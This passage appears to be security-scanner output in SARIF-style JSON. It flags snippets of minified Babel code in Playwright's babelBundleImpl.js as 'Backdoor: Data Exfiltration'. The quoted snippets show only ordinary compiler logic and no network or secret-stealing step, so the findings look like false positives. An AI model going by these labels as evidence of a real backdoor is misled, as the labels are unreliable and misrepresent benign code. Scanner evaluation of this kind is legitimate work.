            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 7643,
                  "endLine": 1708,
                  "endColumn": 7648,
                  "snippet": {
                    "text": "e;return function*(a,o){let l=yield*(0,ua.isAsync)(),u=l?n:r,c=yield*the(l,u,s,a,o);if(c.valid)return c.value;let f=new lg(o),p=t(a,f),m,b;return(0,zde.isIterableIterator)(p)?b=yield*(0,ua.onFirstPause)(p,()=>{m=rhe(f,s,a)}):b=p,B2(u,f,a,b),m&&(s.delete(a),m.release(b)),b}}function*D2(e,t,r){let n=e.get(t);if(n){for(let{value:s,valid:i}of n)if(yield*i(r))return{valid:!0,value:s}}return{valid:!1,value:null}}function*the(e,t,r,n,s){let i=yield*D2(t,n,s);if(i.valid)return i;if(e){let a=yield*D2(r,n,s);if(a.valid)return{valid:!0,value:yield*(0,ua.waitFor)(a.value.promise)}}return{valid:!1,value:null}}f",
                    "rendered": {
                      "text": "e;return function*(a,o){let l=yield*(0,ua.isAsync)(),u=l?n:r,c=yield*the(l,u,s,a,o);if(c.valid)return c.value;let f=new lg(o),p=t(a,f),m,b;return(0,zde.isIterableIterator)(p)?b=yield*(0,ua.onFirstPause)(p,()=>{m=rhe(f,s,a)}):b=p,B2(u,f,a,b),m&&(s.delete(a),m.release(b)),b}}function*D2(e,t,r){let n=e.get(t);if(n){for(let{value:s,valid:i}of n)if(yield*i(r))return{valid:!0,value:s}}return{valid:!1,value:null}}function*the(e,t,r,n,s){let i=yield*D2(t,n,s);if(i.valid)return i;if(e){let a=yield*D2(r,n,s);if(a.valid)return{valid:!0,value:yield*(0,ua.waitFor)(a.value.promise)}}return{valid:!1,value:null}}f",
                      "markdown": "`e;return function*(a,o){let l=yield*(0,ua.isAsync)(),u=l?n:r,c=yield*the(l,u,s,a,o);if(c.valid)return c.value;let f=new lg(o),p=t(a,f),m,b;return(0,zde.isIterableIterator)(p)?b=yield*(0,ua.onFirstPause)(p,()=>{m=rhe(f,s,a)}):b=p,B2(u,f,a,b),m&&(s.delete(a),m.release(b)),b}}function*D2(e,t,r){let n=e.get(t);if(n){for(let{value:s,valid:i}of n)if(yield*i(r))return{valid:!0,value:s}}return{valid:!1,value:null}}function*the(e,t,r,n,s){let i=yield*D2(t,n,s);if(i.valid)return i;if(e){let a=yield*D2(r,n,s);if(a.valid)return{valid:!0,value:yield*(0,ua.waitFor)(a.value.promise)}}return{valid:!1,value:null}}f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 1006,
                  "endLine": 1708,
                  "endColumn": 1011,
                  "snippet": {
                    "text": " jde(e){let t=rr(\"babelHelpers\"),r=[];r.push(ng(\"var\",[sg(t,rg([]))]));let n=kc(r);return Bc(r,t,e),r.push(d2(t)),n}function Bc(e,t,r){let n=i=>t?tg(t,rr(i)):rr(`_${i}`),s={};return Nc().list.forEach(function(i){if(r&&r.indexOf(i)<0)return;let a=s[i]=n(i);Nc().ensure(i,Tde.default);let{nodes:o}=Nc().get(i,n,a);e.push(...o)}),s}function Lde(e,t=\"global\"){let r,n={global:kde,module:Bde,umd:Fde,var:jde}[t];if(n)r=n(e);else throw new Error(`Unsupported output type ${t}`);return(0,u2().default)(r).code}});var Ir=E((Twe,x2)=>{\"use strict\";var g2=Symbol.for(\"gensync:v1:start\"),b2=Symbol.for(\"gensync:v1:su",
                    "rendered": {
                      "text": " jde(e){let t=rr(\"babelHelpers\"),r=[];r.push(ng(\"var\",[sg(t,rg([]))]));let n=kc(r);return Bc(r,t,e),r.push(d2(t)),n}function Bc(e,t,r){let n=i=>t?tg(t,rr(i)):rr(`_${i}`),s={};return Nc().list.forEach(function(i){if(r&&r.indexOf(i)<0)return;let a=s[i]=n(i);Nc().ensure(i,Tde.default);let{nodes:o}=Nc().get(i,n,a);e.push(...o)}),s}function Lde(e,t=\"global\"){let r,n={global:kde,module:Bde,umd:Fde,var:jde}[t];if(n)r=n(e);else throw new Error(`Unsupported output type ${t}`);return(0,u2().default)(r).code}});var Ir=E((Twe,x2)=>{\"use strict\";var g2=Symbol.for(\"gensync:v1:start\"),b2=Symbol.for(\"gensync:v1:su",
                      "markdown": "` jde(e){let t=rr(\"babelHelpers\"),r=[];r.push(ng(\"var\",[sg(t,rg([]))]));let n=kc(r);return Bc(r,t,e),r.push(d2(t)),n}function Bc(e,t,r){let n=i=>t?tg(t,rr(i)):rr(`_${i}`),s={};return Nc().list.forEach(function(i){if(r&&r.indexOf(i)<0)return;let a=s[i]=n(i);Nc().ensure(i,Tde.default);let{nodes:o}=Nc().get(i,n,a);e.push(...o)}),s}function Lde(e,t=\"global\"){let r,n={global:kde,module:Bde,umd:Fde,var:jde}[t];if(n)r=n(e);else throw new Error(`Unsupported output type ${t}`);return(0,u2().default)(r).code}});var Ir=E((Twe,x2)=>{\"use strict\";var g2=Symbol.for(\"gensync:v1:start\"),b2=Symbol.for(\"gensync:v1:su`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 23470,
                  "endLine": 1695,
                  "endColumn": 23475,
                  "snippet": {
                    "text": "r))}addHelper(t){let r=this.declarations[t];if(r)return bde(r);let n=this.get(\"helperGenerator\");if(n){let u=n(t);if(u)return u}Ko().ensure(t,e);let s=this.declarations[t]=this.scope.generateUidIdentifier(t),i={};for(let u of Ko().getDependencies(t))i[u]=this.addHelper(u);let{nodes:a,globals:o}=Ko().get(t,u=>i[u],s,Object.keys(this.scope.getAllBindings()));o.forEach(u=>{this.path.scope.hasBinding(u,!0)&&this.path.scope.rename(u)}),a.forEach(u=>{u._compact=!0});let l=this.path.unshiftContainer(\"body\",a);for(let u of l)u.isVariableDeclaration()&&this.scope.registerDeclaration(u);return s}buildCodeFra",
                    "rendered": {
                      "text": "r))}addHelper(t){let r=this.declarations[t];if(r)return bde(r);let n=this.get(\"helperGenerator\");if(n){let u=n(t);if(u)return u}Ko().ensure(t,e);let s=this.declarations[t]=this.scope.generateUidIdentifier(t),i={};for(let u of Ko().getDependencies(t))i[u]=this.addHelper(u);let{nodes:a,globals:o}=Ko().get(t,u=>i[u],s,Object.keys(this.scope.getAllBindings()));o.forEach(u=>{this.path.scope.hasBinding(u,!0)&&this.path.scope.rename(u)}),a.forEach(u=>{u._compact=!0});let l=this.path.unshiftContainer(\"body\",a);for(let u of l)u.isVariableDeclaration()&&this.scope.registerDeclaration(u);return s}buildCodeFra",
                      "markdown": "`r))}addHelper(t){let r=this.declarations[t];if(r)return bde(r);let n=this.get(\"helperGenerator\");if(n){let u=n(t);if(u)return u}Ko().ensure(t,e);let s=this.declarations[t]=this.scope.generateUidIdentifier(t),i={};for(let u of Ko().getDependencies(t))i[u]=this.addHelper(u);let{nodes:a,globals:o}=Ko().get(t,u=>i[u],s,Object.keys(this.scope.getAllBindings()));o.forEach(u=>{this.path.scope.hasBinding(u,!0)&&this.path.scope.rename(u)}),a.forEach(u=>{u._compact=!0});let l=this.path.unshiftContainer(\"body\",a);for(let u of l)u.isVariableDeclaration()&&this.scope.registerDeclaration(u);return s}buildCodeFra`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 23243,
                  "endLine": 1695,
                  "endColumn": 23248,
                  "snippet": {
                    "text": "}availableHelper(t,r){let n;try{n=Ko().minVersion(t)}catch(s){if(s.code!==\"BABEL_HELPER_UNKNOWN\")throw s;return!1}return typeof r!=\"string\"?!0:(Ic().valid(r)&&(r=`^${r}`),!Ic().intersects(`<${n}`,r)&&!Ic().intersects(\">=8.0.0\",r))}addHelper(t){let r=this.declarations[t];if(r)return bde(r);let n=this.get(\"helperGenerator\");if(n){let u=n(t);if(u)return u}Ko().ensure(t,e);let s=this.declarations[t]=this.scope.generateUidIdentifier(t),i={};for(let u of Ko().getDependencies(t))i[u]=this.addHelper(u);let{nodes:a,globals:o}=Ko().get(t,u=>i[u],s,Object.keys(this.scope.getAllBindings()));o.forEach(u=>{this.",
                    "rendered": {
                      "text": "}availableHelper(t,r){let n;try{n=Ko().minVersion(t)}catch(s){if(s.code!==\"BABEL_HELPER_UNKNOWN\")throw s;return!1}return typeof r!=\"string\"?!0:(Ic().valid(r)&&(r=`^${r}`),!Ic().intersects(`<${n}`,r)&&!Ic().intersects(\">=8.0.0\",r))}addHelper(t){let r=this.declarations[t];if(r)return bde(r);let n=this.get(\"helperGenerator\");if(n){let u=n(t);if(u)return u}Ko().ensure(t,e);let s=this.declarations[t]=this.scope.generateUidIdentifier(t),i={};for(let u of Ko().getDependencies(t))i[u]=this.addHelper(u);let{nodes:a,globals:o}=Ko().get(t,u=>i[u],s,Object.keys(this.scope.getAllBindings()));o.forEach(u=>{this.",
                      "markdown": "`}availableHelper(t,r){let n;try{n=Ko().minVersion(t)}catch(s){if(s.code!==\"BABEL_HELPER_UNKNOWN\")throw s;return!1}return typeof r!=\"string\"?!0:(Ic().valid(r)&&(r=`^${r}`),!Ic().intersects(`<${n}`,r)&&!Ic().intersects(\">=8.0.0\",r))}addHelper(t){let r=this.declarations[t];if(r)return bde(r);let n=this.get(\"helperGenerator\");if(n){let u=n(t);if(u)return u}Ko().ensure(t,e);let s=this.declarations[t]=this.scope.generateUidIdentifier(t),i={};for(let u of Ko().getDependencies(t))i[u]=this.addHelper(u);let{nodes:a,globals:o}=Ko().get(t,u=>i[u],s,Object.keys(this.scope.getAllBindings()));o.forEach(u=>{this.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 22839,
                  "endLine": 1695,
                  "endColumn": 22844,
                  "snippet": {
                    "text": "utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one you currently have installed. If you have your own implementation, you'll want to explore using 'helperGenerator' alongside 'file.availableHelper()'.\");this._map.set(t,r)}get(t){return this._map.get(t)}has(t){return this._map.has(t)}getModuleName(){return(0,l2().getModuleName)(this.opts,this.opts)}availableHelper(t,r){let n;try{n=Ko().minVersion(t)}catch(s){if(s.code!==\"BABEL_HELPER_UNKNOWN\")throw s;return!1}return typeof r!=\"string\"?!0:(Ic().valid(r)&&(r=`^${r}`),!Ic().intersects(`<${n}`,r)&&!",
                    "rendered": {
                      "text": "utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one you currently have installed. If you have your own implementation, you'll want to explore using 'helperGenerator' alongside 'file.availableHelper()'.\");this._map.set(t,r)}get(t){return this._map.get(t)}has(t){return this._map.has(t)}getModuleName(){return(0,l2().getModuleName)(this.opts,this.opts)}availableHelper(t,r){let n;try{n=Ko().minVersion(t)}catch(s){if(s.code!==\"BABEL_HELPER_UNKNOWN\")throw s;return!1}return typeof r!=\"string\"?!0:(Ic().valid(r)&&(r=`^${r}`),!Ic().intersects(`<${n}`,r)&&!",
                      "markdown": "`utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one you currently have installed. If you have your own implementation, you'll want to explore using 'helperGenerator' alongside 'file.availableHelper()'.\");this._map.set(t,r)}get(t){return this._map.get(t)}has(t){return this._map.has(t)}getModuleName(){return(0,l2().getModuleName)(this.opts,this.opts)}availableHelper(t,r){let n;try{n=Ko().minVersion(t)}catch(s){if(s.code!==\"BABEL_HELPER_UNKNOWN\")throw s;return!1}return typeof r!=\"string\"?!0:(Ic().valid(r)&&(r=`^${r}`),!Ic().intersects(`<${n}`,r)&&!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 22391,
                  "endLine": 1695,
                  "endColumn": 22396,
                  "snippet": {
                    "text": "utMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r){if(t===\"helpersNamespace\")throw new Error(\"Babel 7.0.0-beta.56 has dropped support for the 'helpersNamespace' utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one you currently have installed. If you have your own ",
                    "rendered": {
                      "text": "utMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r){if(t===\"helpersNamespace\")throw new Error(\"Babel 7.0.0-beta.56 has dropped support for the 'helpersNamespace' utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one you currently have installed. If you have your own ",
                      "markdown": "`utMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r){if(t===\"helpersNamespace\")throw new Error(\"Babel 7.0.0-beta.56 has dropped support for the 'helpersNamespace' utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one you currently have installed. If you have your own `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 22342,
                  "endLine": 1695,
                  "endColumn": 22347,
                  "snippet": {
                    "text": "his)},this.opts=t,this.code=r,this.ast=n,this.inputMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r){if(t===\"helpersNamespace\")throw new Error(\"Babel 7.0.0-beta.56 has dropped support for the 'helpersNamespace' utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one yo",
                    "rendered": {
                      "text": "his)},this.opts=t,this.code=r,this.ast=n,this.inputMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r){if(t===\"helpersNamespace\")throw new Error(\"Babel 7.0.0-beta.56 has dropped support for the 'helpersNamespace' utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one yo",
                      "markdown": "`his)},this.opts=t,this.code=r,this.ast=n,this.inputMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r){if(t===\"helpersNamespace\")throw new Error(\"Babel 7.0.0-beta.56 has dropped support for the 'helpersNamespace' utility.If you are using @babel/plugin-external-helpers you will need to use a newer version than the one yo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 22122,
                  "endLine": 1695,
                  "endColumn": 22127,
                  "snippet": {
                    "text": "void 0,this.scope=void 0,this.metadata={},this.code=\"\",this.inputMap=void 0,this.hub={file:this,getCode:()=>this.code,getScope:()=>this.scope,addHelper:this.addHelper.bind(this),buildError:this.buildCodeFrameError.bind(this)},this.opts=t,this.code=r,this.ast=n,this.inputMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r",
                    "rendered": {
                      "text": "void 0,this.scope=void 0,this.metadata={},this.code=\"\",this.inputMap=void 0,this.hub={file:this,getCode:()=>this.code,getScope:()=>this.scope,addHelper:this.addHelper.bind(this),buildError:this.buildCodeFrameError.bind(this)},this.opts=t,this.code=r,this.ast=n,this.inputMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r",
                      "markdown": "`void 0,this.scope=void 0,this.metadata={},this.code=\"\",this.inputMap=void 0,this.hub={file:this,getCode:()=>this.code,getScope:()=>this.scope,addHelper:this.addHelper.bind(this),buildError:this.buildCodeFrameError.bind(this)},this.opts=t,this.code=r,this.ast=n,this.inputMap=s,this.path=eg().NodePath.get({hub:this.hub,parentPath:null,parent:this.ast,container:this.ast,key:\"program\"}).setContext(),this.scope=this.path.scope}get shebang(){let{interpreter:t}=this.path.node;return t?t.value:\"\"}set shebang(t){t?this.path.get(\"interpreter\").replaceWith(Ede(t)):this.path.get(\"interpreter\").remove()}set(t,r`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8918,
                  "endLine": 1639,
                  "endColumn": 8923,
                  "snippet": {
                    "text": "0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.remove();else if(t.isExportDefaultDeclaration()){let r=t.get(\"declaration\");if(r.isFunctionDeclaration()||r.isClassDeclaration())r._blockHoist=t.node._blockHoist,t.replaceWith(r);else throw r.buildCodeFrameError(\"Unexpected default expression export.\")}else t.isExportAllDeclaration()&&t.remove()})}});var YC=E(vc=>{\"use strict\";Object.defineProperty(vc,\"__esMo",
                    "rendered": {
                      "text": "0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.remove();else if(t.isExportDefaultDeclaration()){let r=t.get(\"declaration\");if(r.isFunctionDeclaration()||r.isClassDeclaration())r._blockHoist=t.node._blockHoist,t.replaceWith(r);else throw r.buildCodeFrameError(\"Unexpected default expression export.\")}else t.isExportAllDeclaration()&&t.remove()})}});var YC=E(vc=>{\"use strict\";Object.defineProperty(vc,\"__esMo",
                      "markdown": "`0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.remove();else if(t.isExportDefaultDeclaration()){let r=t.get(\"declaration\");if(r.isFunctionDeclaration()||r.isClassDeclaration())r._blockHoist=t.node._blockHoist,t.replaceWith(r);else throw r.buildCodeFrameError(\"Unexpected default expression export.\")}else t.isExportAllDeclaration()&&t.remove()})}});var YC=E(vc=>{\"use strict\";Object.defineProperty(vc,\"__esMo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8655,
                  "endLine": 1639,
                  "endColumn": 8660,
                  "snippet": {
                    "text": "get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.remove();else if(t.isExportDefaultDeclaration()){let r=t.get(\"declaration\");if(r.isFunctionDeclara",
                    "rendered": {
                      "text": "get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.remove();else if(t.isExportDefaultDeclaration()){let r=t.get(\"declaration\");if(r.isFunctionDeclara",
                      "markdown": "`get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.remove();else if(t.isExportDefaultDeclaration()){let r=t.get(\"declaration\");if(r.isFunctionDeclara`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8560,
                  "endLine": 1639,
                  "endColumn": 8565,
                  "snippet": {
                    "text": "legal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.rem",
                    "rendered": {
                      "text": "legal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.rem",
                      "markdown": "`legal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExportNamedDeclaration())t.node.declaration?(t.node.declaration._blockHoist=t.node._blockHoist,t.replaceWith(t.node.declaration)):t.rem`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8430,
                  "endLine": 1639,
                  "endColumn": 8435,
                  "snippet": {
                    "text": "ifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExpor",
                    "rendered": {
                      "text": "ifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExpor",
